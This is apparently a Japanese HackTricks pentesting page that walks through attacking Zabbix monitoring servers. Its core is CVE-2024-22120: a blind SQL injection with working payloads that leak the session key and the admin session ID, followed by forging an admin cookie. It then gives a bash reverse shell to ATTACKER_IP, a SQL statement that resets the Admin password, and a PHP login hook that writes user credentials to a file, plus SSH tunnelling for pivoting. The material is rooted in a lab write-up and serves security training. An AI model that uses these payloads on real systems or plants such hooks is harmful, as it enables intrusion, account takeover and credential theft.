# Zabbix セキュリティ

{{#include ../../banners/hacktricks-training.md}}

## 概要

Zabbix はウェブ UI（通常は Apache/Nginx の背後）と、TCP/10051（server/trapper）で Zabbix プロトコルを使うサーバーコンポーネント、そして TCP/10050 の agent を持つ監視プラットフォームです。エンゲージメント中に遭遇する可能性があるもの:

- Web UI: HTTP(S) の仮想ホスト（例: zabbix.example.tld）
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

有用な cookie フォーマット: zbx_session は compact な JSON オブジェクトを Base64 エンコードしたもので、少なくとも sessionid、serverCheckResult、serverCheckTime、sign を含みます。sign は JSON ペイロードの HMAC です。

## zbx_session cookie の内部構造

最近の Zabbix バージョンは cookie を次のように計算します:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

global session_key と有効な admin sessionid を回収できれば、オフラインで有効な Admin cookie を偽造して UI に認証できます。

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

Affected versions (as publicly documented):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

脆弱性の概要:

- Script execution が Zabbix Server の audit log に記録される際、clientip フィールドがサニタイズされず SQL に連結されるため、サーバーコンポーネント経由で time-based blind SQLi を引き起こします。
- これは、有効な低権限の sessionid、ユーザーがアクセス可能な hostid、許可された scriptid を使って、Zabbix server ポート 10051 に細工した "command" リクエストを送ることで悪用できます。

前提条件と発見のヒント:

- sessionid: web UI の guest/login から、zbx_session をデコード(Base64)して sessionid を取得する。
- hostid: web UI のリクエスト（例: Monitoring → Hosts）で確認するか、プロキシでインターセプトする。一般的なデフォルトは 10084。
- scriptid: 現在のロールで許可されたスクリプトのみ実行される。script メニューや AJAX レスポンスを確認して検証する。1 や 2 のようなデフォルトは許可されていることが多く、3 は拒否される可能性がある。

### 攻撃フロー

1) clientip に SQLi を入れて audit の挿入をトリガー

- TCP/10051 に接続し、request="command" を含む Zabbix フレームメッセージを送り、sid、hostid、scriptid を含め、clientip をサーバーで連結され評価される SQL 式に設定する。

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
完全なワイヤフォーマットは: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON。pwntools または独自の socket コードを使ってフレームできます。

2) Time-bruteforce secrets via conditional sleep

条件式を利用して、hex-encoded secrets を応答時間の測定により1文字ずつ leak します。実際に機能した例:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak 管理者の session_id (userid=1) を sessions から:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
注意:

- charset: 32桁の16進文字 [0-9a-f]
- Pick T_TRUE >> T_FALSE（例: 10 対 1）として、各試行の実時間（wall-clock）を測定する
- scriptid が実際にそのユーザーに対して許可されていることを確認する。そうでないと監査行が作成されず、タイミング計測が機能しない

3) Admin cookie を偽造

以下を入手したら:

- session_key: config.session_key からの 32桁の hex
- admin_sessionid: userid=1 の sessions.sessionid からの 32桁の hex

算出:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

この値で cookie zbx_session を設定し、GET /zabbix.php?action=dashboard.view を実行して管理者アクセスを検証する。

### 既製ツール

- 公開 PoC は session_key と admin sessionid のブルートフォースおよび cookie 偽造を自動化する。pwntools と requests が必要。
- 通常指定するパラメータには次が含まれる: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, および（省略するための）既知の --admin-sid（オプション）。

## RCE（Script 実行による、管理者取得後）

UIで管理者アクセスを得ると、あらかじめ定義された Scripts を監視対象ホストに対して実行できる。agents/hosts がスクリプトコマンドをローカルで実行すると、そのシステム上でのコード実行につながる（多くの場合 Linux ホストでは zabbix ユーザー権限）:

- 簡易確認: id を実行してユーザーコンテキストを確認する
- リバースシェルの例:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY アップグレード (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
DB access がある場合、forging a cookie の代替として、Admin password を "zabbix" 用にドキュメントに記載されている bcrypt にリセットできます：
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

web UI サーバーでファイル書き込みが可能な場合、/usr/share/zabbix/index.php のフォームベースのログイン分岐付近に一時的なログ記録スニペットを追加して資格情報を取得できます:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
ユーザーは通常どおり認証する。続けて /dev/shm/creds.txt を読み取る。作業が終わったらフックを削除する。

## 内部サービスへのピボット

サービスアカウントのシェルが /usr/sbin/nologin であっても、SSH の authorized_keys にエントリを追加し、-N -L を使うことで、ループバック限定のサービス（例: 8111 の CI/CD）へのローカルポートフォワーディングが可能になる:
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
さらなるトンネリングパターンについては、Check [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md)。

## 運用上のヒント

- scriptid が現在のロールで許可されているか検証する（guest は限定されたセットしか持たない場合がある）
- Timing brute は遅くなることがある。回収した admin sessionid をキャッシュして再利用する
- 10051 に送信する JSON は ZBXD\x01 ヘッダと little-endian の長さでフレーム化する必要がある

## 参考資料

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
